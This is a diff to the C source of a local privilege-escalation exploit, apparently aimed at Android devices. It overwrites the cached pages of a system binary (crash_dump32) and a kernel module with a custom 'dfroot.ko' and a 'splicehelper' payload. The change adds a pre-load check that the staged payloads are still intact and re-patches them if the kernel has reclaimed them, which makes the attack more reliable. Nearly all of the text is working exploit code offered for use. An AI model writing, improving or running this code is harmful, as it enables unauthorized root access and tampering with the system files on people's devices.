@@ -205,6 +205,39 @@ static int try_ko_targets(size_t need)
     return -1;
 }
 
+static int read_vendor_content(off64_t offset, uint8_t buf[16]);
+
+/* Read every 16-byte block of a staged range back and compare it with what we
+ * wrote. The patched page cache is clean, so the kernel may reclaim it at any
+ * moment: a half-reclaimed module makes insmod fail with no visible reason.
+ * Returns 0 when the whole range still matches. */
+static int verify_range(const char *path, const char *payload, size_t len,
+                        size_t foff, int use_helper)
+{
+    for (size_t i = 0; i < len / 16; i++) {
+        off64_t off = (off64_t)(foff + i * 16);
+        uint8_t cur[16] = {0};
+        if (use_helper) {
+            int rv = -1;
+            for (int t = 0; t < 2 && rv < 0; t++) rv = read_vendor_content(off, cur);
+            if (rv < 0) return -1;
+        } else {
+            int fd = open(path, O_RDONLY);
+            if (fd < 0) return -1;
+            ssize_t n = pread64(fd, cur, 16, off);
+            close(fd);
+            if (n != 16) return -1;
+        }
+        if (memcmp(cur, payload + i * 16, 16) != 0) {
+            printf("block 0x%08lx%08lx reverted\n",
+                   (unsigned long)((uint64_t)off >> 32),
+                   (unsigned long)((uint64_t)off & 0xffffffffu));
+            return -2;
+        }
+    }
+    return 0;
+}
+
 /* ELF identity of whatever is currently sitting in the bridge's page cache.
  * Our splicehelper is a static ET_EXEC (e_type 2); the stock crash_dump32 is a
  * PIE (e_type 3). If the page cache got evicted and re-read from disk, the
@@ -436,6 +469,11 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
 /* ---- KO and splicehelper blobs ---- */
 
+/* The module actually selected for this device, kept so that it can be
+ * re-verified (and re-patched) right before we trigger the hook. */
+static const char *g_ko_data;
+static size_t      g_ko_len;
+
 extern char libcxx_start[];
 extern char libcxx_data[];
 extern uint32_t libcxx_len;
@@ -583,9 +621,12 @@ static int patch_ko(void) {
         return -1;
     }
 
+    g_ko_data = buf;
+    g_ko_len  = len;
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
-    free(buf);
+    /* deliberately not freed: g_ko_data is re-checked at pre-load time */
     if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
     return ret;
 }
@@ -857,6 +898,20 @@ static int exploit(void) {
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                    &g_libcxx_r)) goto done;
+
+    printf("\n=== pre-load verification ===\n");
+    for (int t = 0; t < 3; t++) {
+        int ok_ko  = g_ko_data ? verify_range(libcxx_ko_target, g_ko_data, g_ko_len, 0, 1) : 0;
+        int ok_brg = verify_range(kCrashDump, (char *)splice_helper_start,
+                                  (size_t)(splice_helper_end - splice_helper_start)
+                                      + ((16 - (size_t)(splice_helper_end - splice_helper_start) % 16) % 16),
+                                  0, 0);
+        if (ok_ko == 0 && ok_brg == 0) { printf("staged images intact\n"); break; }
+        printf("staged images reverted, re-patching (attempt %d)\n", t + 1);
+        if (ok_brg != 0 && patch_helper() != 0) break;
+        if (ok_ko  != 0 && patch_ko()     != 0) break;
+        if (t == 2) printf("WARNING: staging keeps being reclaimed, trying anyway\n");
+    }
 
     rc = 2;
     usleep(500000);
